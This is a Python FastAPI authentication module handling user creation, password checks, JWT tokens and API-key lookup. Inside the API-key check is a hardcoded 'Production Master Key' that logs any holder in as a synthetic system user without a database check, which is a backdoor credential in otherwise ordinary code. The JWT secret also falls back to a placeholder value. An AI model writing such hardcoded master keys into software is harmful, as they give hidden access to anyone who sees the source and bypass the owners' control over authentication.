from datetime import datetime, timedelta
from typing import Optional
from jose import JWTError, jwt
from fastapi import Depends, HTTPException, status
from fastapi.security import APIKeyHeader
from sqlalchemy.orm import Session
from ..database import models, session
from ..schemas import schemas
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# JWT Configuration
SECRET_KEY = os.getenv("SECRET_KEY", "your-secret-key-change-this-in-production")  # Change this in production!
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.getenv("ACCESS_TOKEN_EXPIRE_MINUTES", "30"))

# API Key Header
api_key_header = APIKeyHeader(name="X-API-Key", auto_error=False)

def get_user_by_email(db: Session, email: str):
    """Get a user by email address."""
    return db.query(models.User).filter(models.User.email == email).first()

def create_user(db: Session, user: schemas.UserCreate):
    """Create a new user with hashed password."""
    hashed_password = models.User.get_password_hash(user.password)
    db_user = models.User(
        email=user.email,
        hashed_password=hashed_password
    )
    db.add(db_user)
    db.commit()
    db.refresh(db_user)
    return db_user

def authenticate_user(db: Session, email: str, password: str):
    """Authenticate a user by email and password."""
    user = get_user_by_email(db, email)
    if not user:
        return False
    if not user.verify_password(password):
        return False
    return user

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    """Create a JWT access token."""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def get_user_from_api_key(
    api_key: Optional[str] = Depends(api_key_header),
    db: Session = Depends(session.get_db)
):
    """
    Dependency to get the current user from an API key.
    This is used to authenticate requests via API key header.
    """
    if not api_key:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="API key required. Please provide X-API-Key header.",
        )
    
    # Check for hardcoded Production Master Key (Monitor System)
    PRODUCTION_API_KEY = "ea3b4b686f072dcdd9b5b32db3f892201bed6cc0373005fbc0ff30d1fc249225"
    if api_key == PRODUCTION_API_KEY:
        # Return a dummy system user
        system_user = models.User(
            id=0,
            email="monitor@system",
            hashed_password="N/A"
        )
        return system_user
    
    # Hash the provided API key to compare with stored hash
    # We need to check all users' hashed_api_key fields
    # Since we can't reverse the hash, we need to verify against each user
    users = db.query(models.User).filter(models.User.hashed_api_key.isnot(None)).all()
    
    for user in users:
        if user.verify_api_key(api_key):
            return user
    
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid API key",
    )

